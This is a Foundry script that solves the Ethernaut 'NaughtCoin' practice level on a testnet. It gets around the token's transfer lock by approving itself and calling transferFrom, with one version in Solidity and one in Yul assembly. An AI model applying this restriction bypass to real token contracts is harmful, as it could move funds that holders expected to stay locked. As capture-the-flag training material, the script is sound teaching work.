// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function transferFrom(address, address, uint) external;

    function approve(address, uint) external;

    function player() external view returns (address);

    function balanceOf(address) external view returns (uint256);

    function allowance(address, address) external view returns (uint256);
}

contract NaughtCoinScript is EthernautScript {
    string network = "goerli";
    address level = 0x36E92B2751F260D6a4749d7CA58247E7f8198284;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        uint256 playerBalance = instance.balanceOf(player);
        instance.approve(player, playerBalance);
        instance.transferFrom(player, address(instance), playerBalance);
        require(instance.balanceOf(player) == 0);
    }

    function yulVersion() internal {
        assembly {
            let _instance := sload(instance.slot)
            let _player := sload(player.slot)

            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(4, _player)
            pop(staticcall(gas(), _instance, 0, 0x24, 0, 0x20))
            let playerBalance := mload(0)

            let fmp := mload(0x40)

            mstore(fmp, "approve(address,uint256)")
            mstore(fmp, keccak256(fmp, 24))
            mstore(add(fmp, 4), _player)
            mstore(add(fmp, 0x24), playerBalance)
            let success := call(gas(), _instance, 0, fmp, 0x44, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(fmp, "transferFrom(address,address,uin")
            mstore(add(fmp, 0x20), "t256)")
            mstore(fmp, keccak256(fmp, 37))
            mstore(add(fmp, 4), _player)
            mstore(add(fmp, 0x24), _instance)
            mstore(add(fmp, 0x44), playerBalance)
            success := call(gas(), _instance, 0, fmp, 0x64, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(4, _player)
            pop(staticcall(gas(), _instance, 0, 0x24, 0, 0x20))
            // we check that the final balance of the player is 0
            if iszero(eq(mload(0), 0)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
